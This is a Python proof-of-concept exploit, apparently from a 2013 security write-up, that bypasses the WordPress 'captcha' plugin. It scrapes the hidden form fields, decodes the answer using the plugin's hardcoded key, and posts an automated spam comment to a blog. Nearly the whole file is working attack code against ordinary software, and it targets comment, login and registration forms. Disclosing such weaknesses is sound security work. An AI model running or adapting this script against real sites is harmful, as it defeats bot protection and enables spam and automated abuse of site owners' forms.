import requests
import lxml.html
import hashlib
import binascii

# A blog post site that needs to have the plugin http://wordpress.org/plugins/captcha/ enabled and 
# should have a open comment form. This 'attack' works on every form that the plugin supports [E.g. registration,
# login, ...]. This renders the captcha completely useless.

# Author: Nikolai Tschacher
# Date: 06.11.2013

TARGET = "http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/" # The landing site.
COMMENT_POST = "http://incolumitas.com/wp-comments-post.php" # The comment form to send POST requests at.
KEY = "bws_3110013"

def no_plugin(reason=""):
    print('''The plugin hidden fields couldn't be located. Make sure it is installed. Reason: {}'''.format(reason))
    exit(-1)

# This function reverses essentially the encoding of the hidden field cptch_result.
# It is exactly the same function with the same password as in the plugin source code.
def reverse(captcha, key, cptch_time):
    # just convert all but the captcha string to ascii
    key = key.encode('ascii')
    cptch_time = cptch_time.encode('ascii')
    
    print('[i] Trying to decode key: {}, captcha: {} and cptch_time: {}'.format(captcha, key, cptch_time))
    
    d = hashlib.md5()
    d.update(cptch_time)
    salt = d.hexdigest()
    
    slen = len(captcha)
    seq = key
    gamma = b''
    while len(gamma) < slen:
        sha = hashlib.sha1()
        sha.update("{}{}{}".format(seq, gamma, salt).encode(encoding="ascii"))
        seq = binascii.hexlify(bytes(sha.hexdigest(), 'utf-8')) # what the hell?
        gamma += seq[:8]

    captcha = binascii.a2b_base64(bytes(captcha, 'ascii'));
    #captcha = captcha ^ gamma; Why bothering? PHP uses for xors on strings just the first char. But this first char is apprantly never used oO

    decoded = captcha[1:]

    return decoded
    
if __name__ == '__main__':
        # Obtain post parameters from comment form
        try:
                r = requests.get('http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/')
        except requests.ConnectionError as cerr:
                print('Network problem occured: {}'.format(cerr))
        except requests.Timeout as terr:
                print('Connection timeout: {}'.format(terr))
        if not r.ok:
                print('HTTP Error:', r.status_code)

        # Parse parameters and solve captcha
        
        dom = lxml.html.fromstring(r.text.encode('utf-8'))
        try:
            el = dom.find_class('cptch_block')[0]
        except IndexError as ierr:
            no_plugin('find_class cptch_block') # No such CSS class found means most likely the plugin is not installed.
            
        captcha = el.text_content().strip()

        for c in el.getchildren():
                try:
                        if c.attrib['name'] == 'cptch_result':
                                result = c.attrib['value']
                        if c.attrib['name'] == 'cptch_time':
                                time = c.attrib['value']
                except KeyError:
                        pass

        el= dom.find_class('form-submit')[0]
        for c in el.getchildren():
                try:
                        if c.attrib['name'] == 'comment_post_ID':
                                post_id = c.attrib['value']
                        if c.attrib['name'] == 'comment_parent':
                                comment_parent = c.attrib['value']
                except KeyError:
                        pass

        print('[+] Captcha is "{}"'.format(captcha))
        
        # Try to crickiticrack it :/
        solution = reverse(captcha, KEY, time)
        
        
        # No write a comment with the cracked captcha to proof that we provided the
        # correct solution.
        payload = {'author': 'spammer', 'email': 'spammer@spamhouse.org', 'url': 'http://spamming.com',
        'cptch_result': result, 'cptch_time': time, 'cptch_number': solution,
        'comment': "Hi there! No protection from spammers!!!:D", 'submit': 'Post+Comment',
        'comment_post_ID': post_id, 'comment_parent': comment_parent}

        try:
                r = requests.post(COMMENT_POST, data=payload)
        except requests.ConnectionError as cerr:
                print('Network problem occured: {}'.format(cerr))
        except requests.Timeout as terr:
                print('Connection timeout: {}'.format(terr))
        if not r.ok:
                print('HTTP Error:', r.status_code)

